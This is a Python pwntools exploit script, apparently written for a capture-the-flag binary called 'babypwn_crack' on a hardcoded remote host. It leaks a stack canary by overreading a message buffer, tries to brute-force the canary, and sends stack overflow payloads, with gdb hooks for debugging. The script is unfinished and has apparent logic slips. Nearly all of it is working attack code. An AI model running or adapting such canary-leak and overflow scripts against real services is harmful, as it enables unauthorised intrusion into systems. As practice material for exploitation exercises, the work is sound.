from pwn import *
from termcolor import colored
"""===============    Configuration    ================"""

class Exploit():

    recvMsgAdr = "0x080488b1"
    sendMsgAdr = "0x08048907"
    exitCmp    = "0x08048b57"
    def __init__(self):
        self.pwnName = "babypwn_crack"
        self.local = True
        self.host, self.port = '110.10.212.130', 8888
        context.endian = 'little'
        context.arch = 'i386'
        context.os = "linux"
        context.log_level = "DEBUG"
        context.terminal = ['tmux', 'splitw', '-h']
        self.binary = ELF(self.pwnName)
        self.connect()
        ################################################

    def connect(self):
        if self.local:
            self.vp = process(["./" + self.pwnName, " %s"%self.port])

            self.host = "localhost"
            self.r = remote(self.host, self.port)

        else:
            self.r = remote(self.host, self.port)

    def menu(self, choice):
        print self.r.recvuntil('> ') + str(choice)
        self.r.sendline(str(choice))
        if choice == 3:
            self.r.close()
            self.r = remote(self.host,self.port)
            print colored(self.vp.recv(), "red")


    def getLeak(self):
        #"Input Your Message : "
        #49 is the lowest amount of a's to get the canary from strlen
        data= 'A'*47 + "BC"
        print self.r.sendafter(': ', str(data)) + str(data)
        leak = self.r.recvline().strip()

        self.leak = leak.split('B')
        #first 4 bytes = part of canary
        canary = leak[:4]
        canary = u32(canary)
        canary -= 0x43 # Remove the c
        self.canary = canary

    def overflow(self):
        #canary is checked at point offset 15-19

        data=fit({},filler='ABCDEFHIJKLMNOPQRSTUVWYXZabcdefghijklmnopqrstuvwyxz', length=100)
        print self.r.sendafter(': ', str(data)) + str(data)
        print self.r.recvline()

    def bruteForceCanary(self):
        #"Input Your Message : "
        filler =fit({},filler='ABCDEFHIJKLMNOPQRSTUVWYXZabcdefghijklmnopqrstuvwyxz', length=100)
        overFlow = 'A' *500
        for x  in xrange(0xFF):
            self.menu(1)
            payload = filler + p32( self.canary + x) + filler
            print self.r.sendafter(": ", payload)
            self.menu(3)


if __name__ == "__main__":
    exp = Exploit()
    exp.menu(1)
    exp.getLeak()
    exp.menu(3)
    exp.menu(1)
    print colored(exp.leak, 'green')
    gdb.attach(exp.r, execute="b *{}".format(
        exp.exitCmp)
    )
    exp.overflow()
    exp.menu(3)

    """
    exp.menu(1)
    exp.getLeak()
    exp.menu(3)
    exp.bruteForceCanary()
    """


